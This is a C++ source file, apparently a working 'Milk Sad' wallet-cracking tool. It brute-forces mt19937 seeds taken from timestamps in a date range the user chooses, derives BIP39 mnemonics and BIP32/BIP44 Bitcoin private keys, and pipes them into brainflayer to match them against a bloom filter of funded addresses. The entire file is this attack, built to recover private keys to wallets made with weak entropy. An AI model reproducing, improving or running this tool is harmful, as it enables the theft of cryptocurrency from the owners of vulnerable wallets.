/**
 * Milk Sad Scanner - Optimized Legacy Edition (v5 FULL) with Single Brainflayer Instance
 * 
 * Upgrade:
 * - Hanya satu proses brainflayer, semua worker menulis ke pipe.
 * - Mengurangi penggunaan memori (bloom filter hanya di‑load sekali).
 * - Output brainflayer digabung dalam satu file log.
 * - Progress reporting tetap via file per worker.
 */

#define _DEFAULT_SOURCE
#define _BSD_SOURCE

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <stdexcept>
#include <algorithm>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/bn.h>
#include <openssl/obj_mac.h>
#include <thread>
#include <atomic>
#include <random>
#include <cstring>
#include <cstdio>
#include <cstdint>
#include <fcntl.h>      // untuk open, O_*
#include <errno.h>

// ================= CONFIG =================
const std::string WORDLIST_FILE = "./Wordlist/english.txt";
const std::string OUTPUT_PREFIX = "found_legacy_keys_";
const uint64_t REPORT_INTERVAL = 20000;
const std::string BRAINFLAYER_BIN = "./brainflayer/brainflayer";
const std::string BLOOM_FILTER = "./040823BF.blm";
const int ENTROPY_BYTES = 24;

// ================= GLOBAL =================
std::vector<pid_t> g_child_pids;   // worker pids
pid_t g_brainflayer_pid = -1;
std::atomic<bool> g_stop_flag(false);

// ================= HELPERS =================
void signal_handler(int) {
    if (g_stop_flag) return;
    g_stop_flag = true;
    const char* msg = "\n[!] Interrupt. Stopping...\n";
    write(STDOUT_FILENO, msg, strlen(msg));
    for (pid_t pid : g_child_pids) if (pid > 0) kill(pid, SIGTERM);
    if (g_brainflayer_pid > 0) kill(g_brainflayer_pid, SIGTERM);
}

bool file_exists(const std::string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    std::ifstream file(filename);
    if (!file) throw std::runtime_error("Wordlist not found");

    std::string word;
    while (std::getline(file, word)) {
        size_t last = word.find_last_not_of(" \t\r\n");
        if (last != std::string::npos) wordlist.push_back(word.substr(0, last + 1));
    }
    if (wordlist.size() != 2048) throw std::runtime_error("Wordlist must be 2048 words");
    return wordlist;
}

std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &ctx);
    return hash;
}

// ================= OPENSSL CONTEXT =================
struct CryptoContext {
    EC_GROUP* group;
    BN_CTX* ctx;
    BIGNUM* order;
    BIGNUM* bn_temp;
    BIGNUM* bn_temp2;
    EC_POINT* point_temp;
    unsigned char ser_buf[37];

    CryptoContext() {
        group = EC_GROUP_new_by_curve_name(NID_secp256k1);
        ctx = BN_CTX_new();
        order = BN_new();
        EC_GROUP_get_order(group, order, ctx);
        bn_temp = BN_new();
        bn_temp2 = BN_new();
        point_temp = EC_POINT_new(group);
    }

    ~CryptoContext() {
        EC_POINT_free(point_temp);
        BN_free(bn_temp);
        BN_free(bn_temp2);
        BN_free(order);
        BN_CTX_free(ctx);
        EC_GROUP_free(group);
    }
};

struct HDKey {
    std::vector<uint8_t> key;
    std::vector<uint8_t> chain_code;
    bool valid;
};

// ================= MNEMONIC =================
std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {

    std::mt19937 engine(seed_value);
    std::vector<uint8_t> entropy(ENTROPY_BYTES);

    for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
        uint32_t r = engine();
        entropy[i] = r & 0xFF;
        entropy[i + 1] = (r >> 8) & 0xFF;
        entropy[i + 2] = (r >> 16) & 0xFF;
        entropy[i + 3] = (r >> 24) & 0xFF;
    }

    auto hash = sha256(entropy);
    std::vector<uint8_t> combined = entropy;
    combined.push_back(hash[0]);

    int total_bits = ENTROPY_BYTES * 8;
    int checksum_len = total_bits / 32;
    int total_len_bits = total_bits + checksum_len;
    int num_words = total_len_bits / 11;

    std::string mnemonic;
    mnemonic.reserve(150);

    for (int i = 0; i < num_words; ++i) {
        int word_idx = 0;
        for (int b = 0; b < 11; ++b) {
            int pos = i * 11 + b;
            int byte_pos = pos / 8;
            int bit_rem = 7 - (pos % 8);
            uint8_t val = (combined[byte_pos] >> bit_rem) & 1;
            word_idx |= (val << (10 - b));
        }
        if (i) mnemonic += " ";
        mnemonic += wordlist[word_idx];
    }
    return mnemonic;
}

std::vector<uint8_t> mnemonic_to_seed(const std::string& mnemonic) {
    std::vector<uint8_t> seed(64);
    PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                      (const unsigned char*)"mnemonic", 8,
                      2048, EVP_sha512(), 64, seed.data());
    return seed;
}

// ================= BIP32 =================
HDKey hd_master_key_from_seed(const std::vector<uint8_t>& seed) {
    unsigned char hash[64];
    HMAC(EVP_sha512(), "Bitcoin seed", 12, seed.data(), seed.size(), hash, NULL);
    return { std::vector<uint8_t>(hash, hash+32), std::vector<uint8_t>(hash+32, hash+64), true };
}

HDKey CKDpriv_fast(const HDKey& parent, uint32_t index, CryptoContext& cc) {

    if (!parent.valid) return { {}, {}, false };

    unsigned char* data = cc.ser_buf;
    bool hardened = index & 0x80000000;

    if (hardened) {
        data[0]=0;
        memcpy(data+1,parent.key.data(),32);
    } else {
        BN_bin2bn(parent.key.data(),32,cc.bn_temp);
        EC_POINT_mul(cc.group,cc.point_temp,cc.bn_temp,NULL,NULL,cc.ctx);
        EC_POINT_point2oct(cc.group,cc.point_temp,POINT_CONVERSION_COMPRESSED,data,33,cc.ctx);
    }

    data[33]=(index>>24)&0xFF;
    data[34]=(index>>16)&0xFF;
    data[35]=(index>>8)&0xFF;
    data[36]=index&0xFF;

    unsigned char I[64];
    HMAC(EVP_sha512(),parent.chain_code.data(),32,data,37,I,NULL);

    BN_bin2bn(I,32,cc.bn_temp);
    if(BN_cmp(cc.bn_temp,cc.order)>=0) return {{},{},false};

    BN_bin2bn(parent.key.data(),32,cc.bn_temp2);

    BIGNUM* kchild=BN_new();
    BN_mod_add(kchild,cc.bn_temp,cc.bn_temp2,cc.order,cc.ctx);

    if(BN_is_zero(kchild)){ BN_free(kchild); return {{},{},false}; }

    std::vector<uint8_t> child(32);
    BN_bn2binpad(kchild,child.data(),32);
    BN_free(kchild);

    return {child,std::vector<uint8_t>(I+32,I+64),true};
}

// ================= UTIL =================
std::string to_hex(const std::vector<uint8_t>& data){
    static const char h[]="0123456789abcdef";
    std::string r(data.size()*2,' ');
    for(size_t i=0;i<data.size();++i){ r[i*2]=h[data[i]>>4]; r[i*2+1]=h[data[i]&0xF]; }
    return r;
}

// ================= WORKER =================
void worker_process(int id, uint64_t start, uint64_t end, int step,
                    const std::vector<std::string>& wordlist, int num_derivations,
                    int pipe_fd) {

    CryptoContext cc;

    const uint32_t H = 0x80000000;

    // File untuk progress reporting
    std::string prog_file = "/tmp/milksad_progress_" + std::to_string(getpid()) + ".tmp";
    uint64_t processed_timestamps = 0;

    for (uint64_t ts = start; ts <= end && !g_stop_flag; ts += step) {

        if (ts > UINT32_MAX) continue;
        uint32_t seed_val = (uint32_t)ts;

        std::string m = generate_mnemonic_bip39(seed_val, wordlist);
        auto seed = mnemonic_to_seed(m);
        auto master = hd_master_key_from_seed(seed);

        // Kirim master private key
        std::string master_hex = to_hex(master.key);
        if (dprintf(pipe_fd, "%s\n", master_hex.c_str()) < 0) {
            // Pipe error, kemungkinan brainflayer mati
            break;
        }

        // Derivation BIP44: m/44'/0'/0'
        auto k44 = CKDpriv_fast(master, 44 | H, cc);
        if (!k44.valid) continue;

        auto kCoin = CKDpriv_fast(k44, 0 | H, cc);
        if (!kCoin.valid) continue;

        auto kAcc = CKDpriv_fast(kCoin, 0 | H, cc);
        if (!kAcc.valid) continue;

        // Loop untuk chain eksternal (0) dan internal (1)
        for (uint32_t chain = 0; chain <= 1; ++chain) {

            auto kChange = CKDpriv_fast(kAcc, chain, cc);
            if (!kChange.valid) continue;

            int derived = 0;
            uint32_t idx = 0;

            while (derived < num_derivations) {
                auto child = CKDpriv_fast(kChange, idx++, cc);
                if (!child.valid) continue;
                std::string hex = to_hex(child.key);
                if (dprintf(pipe_fd, "%s\n", hex.c_str()) < 0) {
                    // Pipe error
                    goto finish;  // keluar dari semua loop
                }
                derived++;
            }
        }

        // Update progress counter
        processed_timestamps++;
        if (processed_timestamps % 100 == 0) {
            FILE* fp = fopen(prog_file.c_str(), "w");
            if (fp) {
                fprintf(fp, "%llu\n", (unsigned long long)processed_timestamps);
                fclose(fp);
            }
        }
    }

finish:
    // Tulis progress terakhir
    FILE* fp = fopen(prog_file.c_str(), "w");
    if (fp) {
        fprintf(fp, "%llu\n", (unsigned long long)processed_timestamps);
        fclose(fp);
    }
}

// ================= MAIN =================
int main() {
    // Abaikan SIGPIPE agar write ke pipe yang mati tidak mematikan worker
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);

    if (!file_exists(BRAINFLAYER_BIN) || !file_exists(BLOOM_FILTER)) {
        std::cerr << "Missing files\n";
        return 1;
    }

    auto wordlist = load_wordlist(WORDLIST_FILE);

    std::string s, e;
    std::cout << "Start Date YYYY-MM-DD: "; std::cin >> s;
    std::cout << "End Date YYYY-MM-DD: "; std::cin >> e;

    struct tm tm1{}, tm2{};
    strptime((s + " 00:00:00").c_str(), "%Y-%m-%d %H:%M:%S", &tm1);
    strptime((e + " 23:59:59").c_str(), "%Y-%m-%d %H:%M:%S", &tm2);

    uint64_t start = timegm(&tm1);
    uint64_t end = timegm(&tm2);
    uint64_t total_timestamps = end - start + 1;

    int threads;
    std::cout << "Threads: "; std::cin >> threads;

    // Buat pipe untuk komunikasi worker -> brainflayer
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    // Fork brainflayer
    g_brainflayer_pid = fork();
    if (g_brainflayer_pid == 0) {
        // Child: brainflayer
        close(pipefd[1]);                // tutup write
        dup2(pipefd[0], STDIN_FILENO);   // baca dari pipe
        close(pipefd[0]);

        // Redirect stdout ke file log
        std::string logfile = OUTPUT_PREFIX + "brainflayer.log";
        int fd_out = open(logfile.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd_out == -1) {
            perror("open logfile");
            exit(1);
        }
        dup2(fd_out, STDOUT_FILENO);
        close(fd_out);

        // Exec brainflayer
        execlp(BRAINFLAYER_BIN.c_str(),
               BRAINFLAYER_BIN.c_str(),
               "-v", "-b", BLOOM_FILTER.c_str(),
               "-t", "priv", "-x", NULL);
        perror("execlp brainflayer");
        exit(1);
    } else if (g_brainflayer_pid < 0) {
        perror("fork brainflayer");
        return 1;
    }

    // Parent: tutup sisi baca pipe
    close(pipefd[0]);
    int pipe_write_fd = pipefd[1];   // fd untuk menulis ke brainflayer

    // Fork worker
    g_child_pids.resize(threads);
    for (int i = 0; i < threads; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // Worker process
            worker_process(i, start + i, end, threads, wordlist, 5, pipe_write_fd);
            exit(0);
        } else if (pid > 0) {
            g_child_pids[i] = pid;
        } else {
            perror("fork worker");
            // Tetap lanjut dengan thread yang ada
        }
    }

    // Parent tidak perlu menulis ke pipe, tutup salinan fd-nya
    close(pipe_write_fd);

    // --- Progress monitoring loop ---
    time_t start_time = time(nullptr);
    uint64_t last_processed = 0;
    
    while (true) {
        sleep(2);
    
        // Reap zombie workers
        for (pid_t pid : g_child_pids) {
            int status;
            waitpid(pid, &status, WNOHANG);
        }
    
        // Cek apakah semua worker masih hidup
        int alive = 0;
        for (pid_t pid : g_child_pids) {
            if (kill(pid, 0) == 0) alive++;
        }
        if (alive == 0) break; // Semua selesai
    
        // Baca progress dari setiap worker
        uint64_t sum_processed = 0;
        for (pid_t pid : g_child_pids) {
            std::string prog_file = "/tmp/milksad_progress_" + std::to_string(pid) + ".tmp";
            FILE* fp = fopen(prog_file.c_str(), "r");
            if (fp) {
                unsigned long long val;
                if (fscanf(fp, "%llu", &val) == 1) {
                    sum_processed += val;
                }
                fclose(fp);
            }
        }
    
        time_t now = time(nullptr);
        double elapsed = difftime(now, start_time);
        double percent = (double)sum_processed / total_timestamps * 100.0;
        double rate = (elapsed > 0) ? sum_processed / elapsed : 0;
        double eta = (rate > 0) ? (total_timestamps - sum_processed) / rate : 0;
    
        printf("\rProgress: %llu/%llu (%.2f%%) | Rate: %.1f ts/s | Elapsed: %.0fs | ETA: %.0fs   ",
               (unsigned long long)sum_processed, (unsigned long long)total_timestamps,
               percent, rate, elapsed, eta);
        fflush(stdout);
    
        last_processed = sum_processed;
    }
    
    // Semua worker selesai, tunggu brainflayer (yang akan EOF karena pipe tertutup)
    int brain_status;
    if (waitpid(g_brainflayer_pid, &brain_status, 0) == -1) {
        if (errno != ECHILD) {
            perror("waitpid brainflayer");
        }
    }

    // Hapus file progress
    for (pid_t pid : g_child_pids) {
        std::string prog_file = "/tmp/milksad_progress_" + std::to_string(pid) + ".tmp";
        unlink(prog_file.c_str());
    }

    printf("\nDone. Semua proses selesai. Output brainflayer di %sbrainflayer.log\n", OUTPUT_PREFIX.c_str());
    return 0;
}
